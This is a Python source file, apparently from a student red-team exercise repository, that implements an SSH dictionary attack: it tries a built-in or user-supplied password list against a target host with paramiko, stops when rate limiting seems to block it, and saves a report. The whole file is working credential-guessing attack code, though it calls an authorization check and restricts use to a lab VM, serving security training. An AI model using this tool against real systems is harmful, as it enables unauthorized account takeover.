# Red Team contribution represented in this group repository: Andy Vega Araya.
# Executable logic preserved from the supplied Red Team module.
import time

import paramiko

from modules.authorization import confirm_authorized_target
from modules.reporting import save_report

DEFAULT_WORDLIST = [
    "123456",
    "password",
    "admin",
    "root",
    "ubuntu",
    "changeme",
    "qwerty",
]

DELAY_BETWEEN_ATTEMPTS_SECONDS = 1.5
CONSECUTIVE_REFUSALS_BEFORE_BAN_ASSUMED = 3


def try_login(host, username, password, port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=5,
            banner_timeout=5,
            auth_timeout=5,
        )
        client.close()
        return True, "success"
    except paramiko.AuthenticationException:
        return False, "auth_failed"
    except (paramiko.SSHException, OSError):
        return False, "connection_refused"


def brute_force(host, username, wordlist):
    attempts = []
    found_password = None
    consecutive_refusals = 0
    likely_blocked = False

    for password in wordlist:
        success, outcome = try_login(host, username, password)
        print(f"[ssh] {username}:{password} -> {outcome}")
        attempts.append({"password": password, "success": success, "outcome": outcome})

        if success:
            found_password = password
            break

        if outcome == "connection_refused":
            consecutive_refusals += 1
            if consecutive_refusals >= CONSECUTIVE_REFUSALS_BEFORE_BAN_ASSUMED:
                likely_blocked = True
                print(f"[ssh] {consecutive_refusals} consecutive refusals, likely rate-limited. Stopping.")
                break
        else:
            consecutive_refusals = 0

        time.sleep(DELAY_BETWEEN_ATTEMPTS_SECONDS)

    return {
        "username": username,
        "attempts": attempts,
        "attempts_made": len(attempts),
        "credential_found": found_password is not None,
        "password_found": found_password,
        "likely_blocked_by_rate_limiting": likely_blocked,
    }


def main():
    print("Red Team SSH Dictionary Attack")
    print("Use only against the Blue Team VM you are authorized to test.\n")

    target = input("Target IP/hostname: ").strip()
    confirm_authorized_target(target)

    username = input("Username to test: ").strip()

    use_default = input(f"Use the built-in {len(DEFAULT_WORDLIST)}-word list? [Y/n]: ").strip().lower()
    if use_default in ("", "y", "yes"):
        wordlist = DEFAULT_WORDLIST
    else:
        wordlist_path = input("Path to wordlist file: ").strip()
        with open(wordlist_path, "r", encoding="utf-8") as f:
            wordlist = [line.strip() for line in f if line.strip()]

    print(f"\nTesting {username}@{target} against {len(wordlist)} candidates\n")
    results = brute_force(target, username, wordlist)

    report_path = save_report(tool_name="ssh_brute", target=target, data=results)
    print(f"\nReport saved to: {report_path}")


if __name__ == "__main__":
    main()
